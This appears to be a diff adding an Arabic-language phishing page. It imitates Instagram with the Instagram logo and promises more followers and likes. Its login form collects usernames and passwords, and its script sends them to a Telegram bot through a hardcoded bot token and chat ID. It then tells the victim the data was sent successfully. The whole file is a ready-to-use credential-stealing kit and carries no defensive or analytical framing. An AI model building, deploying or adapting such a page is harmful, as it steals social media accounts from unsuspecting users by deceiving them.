@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>زيادة المتابعين - تسجيل الدخول</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(to bottom, #833ab4, #fd1d1d, #fcb045);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #fff;
+            overflow: hidden;
+        }
+
+        .login-container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            border-radius: 20px;
+            width: 350px;
+        }
+
+        .logo {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #ffd700;
+            text-shadow: 1px 1px 5px rgba(0, 0, 0, 0.5);
+        }
+
+        p {
+            font-size: 16px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            outline: none;
+            background: #fff;
+            color: #333;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #fd1d1d;
+            color: #fff;
+            font-size: 16px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        .login-btn:hover {
+            background: #fcb045;
+        }
+
+        .signup-link {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .signup-link a {
+            color: #ffd700;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+        <h1>زيادة المتابعين والإعجابات</h1>
+        <p>سجّل دخولك الآن لزيادة عدد متابعيك والإعجابات على حسابك بسهولة وسرعة.</p>
+        <form id="loginForm">
+            <input type="text" id="username" class="input-field" placeholder="اسم المستخدم" required>
+            <input type="password" id="password" class="input-field" placeholder="كلمة المرور" required>
+            <button type="button" class="login-btn" onclick="sendToTelegram()">تسجيل الدخول</button>
+        </form>
+        <div class="signup-link">
+            <p>ليس لديك حساب؟ <a href="#">إنشاء حساب جديد</a></p>
+        </div>
+    </div>
+
+    <script>
+        function sendToTelegram() {
+            const botToken = "7161404245:AAHn5BdqIKD85Essh8amh2_AeZTdxZaIu2I"; // ضع رمز البوت هنا
+            const chatId = "6904870871"; // ضع معرف الشات هنا
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            // نص الرسالة
+            const message = `🔔 تسجيل جديد:
+اسم المستخدم: ${username}
+كلمة المرور: ${password}`;
+
+            // إرسال الطلب
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("تم إرسال البيانات بنجاح!");
+                } else {
+                    alert("حدث خطأ أثناء الإرسال.");
+                }
+            })
+            .catch(error => {
+                alert("حدث خطأ: " + error.message);
+            });
+        }
+    </script>
+</body>
+</html>
